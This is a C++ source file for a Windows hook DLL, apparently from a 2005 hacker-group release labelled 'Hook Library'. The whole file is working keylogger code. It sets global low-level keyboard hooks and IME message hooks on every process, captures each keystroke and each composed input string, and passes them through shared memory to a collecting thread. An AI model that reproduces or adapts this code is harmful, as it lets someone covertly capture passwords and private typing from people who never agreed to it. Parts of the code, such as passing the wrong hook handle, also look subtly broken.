/*---------------------------------------------------------------------------
FileName:HookDll.cpp
Usage:Hook Library V1.2
发布： 火狐技术联盟[F.S.T] 2005/10/08
网站:http://www.wrsky.com
版权：原作者所有
----------------------------------------------------------------------------*/
#include "stdafx.h"
#include <stdio.h>
#include <iostream>
#include <imm.h>
#include "../WinService/tool.h"
#pragma comment(lib,"imm32.lib") 
#define HOOKDLL_API __declspec(dllexport)

#pragma data_seg(".inidata")
//HWND APP_hdl;                       //用来保存调用程序窗口句柄
static HINSTANCE  this_dll;                   //用来保存该动态连接库的句柄

static SharedMemory sm(SHARED_MEMORY_NAME);
static int thread_id = 0;
static HHOOK message_hook, keyboard_hook, debug_hook;

#pragma data_seg() 
//

//--------------------------------------------------------------
extern "C" __declspec(dllexport) bool start_message_hook();
extern "C" __declspec(dllexport) bool stop_message_hook();
extern "C" __declspec(dllexport) bool start_keyboard_hook();
extern "C" __declspec(dllexport) bool stop_keyboard_hook();
extern "C" __declspec(dllexport) bool start_debug_hook();
extern "C" __declspec(dllexport) bool stop_debug_hook();
//--------------------------------------------------------------                               
LRESULT CALLBACK message_hook_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
	CallNextHookEx(message_hook, nCode, wParam, lParam);
	if(!thread_id)
		return 0;
	if(nCode != HC_ACTION) 
		return 0;
	PMSG pmsg = (PMSG)lParam;

	if(pmsg->message == WM_IME_COMPOSITION && (pmsg->lParam & GCS_RESULTSTR)){
		HWND hWnd = pmsg->hwnd;
		HIMC hIMC = ImmGetContext(hWnd);
		if(!hIMC)  
			return 0;
		DWORD dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);
		dwSize += sizeof(WCHAR);
		char lpstr[128] = {0};
		ImmGetCompositionString(hIMC, GCS_RESULTSTR, lpstr, dwSize); 
		ImmReleaseContext(hWnd, hIMC);
		sm.write_mem(lpstr, sizeof(int), sizeof(lpstr));
		PostThreadMessage(thread_id, WM_MESSAGE_HOOK, wParam, lParam);
	}
	return 0;
}
LRESULT CALLBACK keyboard_hook_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if(nCode < 0)
		return CallNextHookEx(message_hook, nCode, wParam, lParam);
	if(wParam != WM_KEYDOWN && wParam != WM_SYSKEYDOWN){
		return CallNextHookEx(message_hook, nCode, wParam, lParam);
	}
	LPKBDLLHOOKSTRUCT keyboard = (KBDLLHOOKSTRUCT FAR*)lParam;
    bool control = ((GetKeyState(VK_LCONTROL) & 0x80) != 0) ||
                    ((GetKeyState(VK_RCONTROL) & 0x80) != 0);
    bool shift = ((GetKeyState(VK_LSHIFT) & 0x80) != 0) ||
                    ((GetKeyState(VK_RSHIFT) & 0x80) != 0);
    bool alt = ((GetKeyState(VK_LMENU) & 0x80) != 0) ||
                ((GetKeyState(VK_RMENU) & 0x80) != 0);
    bool capslock = (GetKeyState(VK_CAPITAL) != 0);
	unsigned char key_state[256] = {0};
	GetKeyboardState(key_state);
	char ch[2] = {0};
	int ret = ToAscii(keyboard->vkCode, keyboard->scanCode, key_state, (WORD*)ch, keyboard->flags);
	ch[1] = 0;
	if(isprint(ch[0])){
		sm.write_mem(ch, sizeof(int), sizeof(ch));
	} else{
		char str[20] = {0};
		ret = GetKeyNameText((MapVirtualKey(keyboard->vkCode, 0)<<16), str, sizeof(str));
		sm.write_mem(str, sizeof(int), sizeof(str));
	}
	PostThreadMessage(thread_id, WM_KEYBOARD_HOOK, wParam, lParam);
	return CallNextHookEx(message_hook, nCode, wParam, lParam);
}
LRESULT CALLBACK debug_hook_proc(int nCode, WPARAM wParam, LPARAM lParam){
	return CallNextHookEx(debug_hook, nCode, wParam, lParam);
}
extern "C" __declspec(dllexport) bool start_message_hook()
{
	if(message_hook == NULL)
		message_hook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)message_hook_proc,  this_dll, 0);
	return message_hook != NULL;
}
extern "C" __declspec(dllexport) bool stop_message_hook()
{
	bool ret = true;
	if(message_hook != NULL)
		ret = UnhookWindowsHookEx(message_hook);
	message_hook = NULL;
	return ret;
}
extern "C" __declspec(dllexport) bool start_keyboard_hook(){
	if(keyboard_hook == NULL)
		keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keyboard_hook_proc,  this_dll, 0);
	return keyboard_hook != NULL;
}
extern "C" __declspec(dllexport) bool stop_keyboard_hook(){
	bool ret = true;
	if(keyboard_hook != NULL)
		ret = UnhookWindowsHookEx(keyboard_hook);
	keyboard_hook = NULL;
	return ret;
}
extern "C" __declspec(dllexport) bool start_debug_hook(){
	if(debug_hook == NULL)
		debug_hook = SetWindowsHookEx(WH_DEBUG, (HOOKPROC)debug_hook_proc,  this_dll, 0);
	return debug_hook != NULL;
}
extern "C" __declspec(dllexport) bool stop_debug_hook(){
	bool ret = true;
	if(debug_hook != NULL)
		ret = UnhookWindowsHookEx(debug_hook);
	debug_hook = NULL;
	return ret;
}
//------------------------------------------------------------------------
BOOL APIENTRY DllMain( HANDLE hModule, 
	DWORD  ul_reason_for_call, 
	LPVOID lpReserved
	)
{		
	char process_name[MAX_PATH];
	get_process_name(GetCurrentProcessId(), process_name);
	if(sm.open()){
		thread_id = sm.read_int();
	}
	switch(ul_reason_for_call){
	case DLL_PROCESS_ATTACH:
		 this_dll=(HINSTANCE)hModule; 
		Logger::debug("Attach: %s-%d", process_name, thread_id);
		break;
	case DLL_PROCESS_DETACH://单线程析构函数
		sm.destroy();
		Logger::debug("Detach: %s-%d", process_name, thread_id);
		break;
	default:
		break;
	}
	return TRUE;
}
